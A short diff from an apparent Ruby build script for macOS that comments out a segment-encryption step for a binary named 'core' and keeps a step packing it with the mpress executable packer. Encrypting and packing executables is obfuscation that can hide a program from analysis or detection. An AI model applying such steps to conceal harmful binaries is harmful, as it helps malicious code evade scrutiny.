@@ -35,8 +35,8 @@ class BuildOSX < Build
     # invoke the generic patch method with the new params
     super
 
-    FileUtils.mv path(params[:core]), path('core_clear')
-    CrossPlatform.exec path('seg_encrypt'), path('core_clear') + ' ' + path(params[:core])
+    #FileUtils.mv path(params[:core]), path('core_clear')
+    #CrossPlatform.exec path('seg_encrypt'), path('core_clear') + ' ' + path(params[:core])
     CrossPlatform.exec path('mpress'), "-ub " + path(params[:core])
 
   end
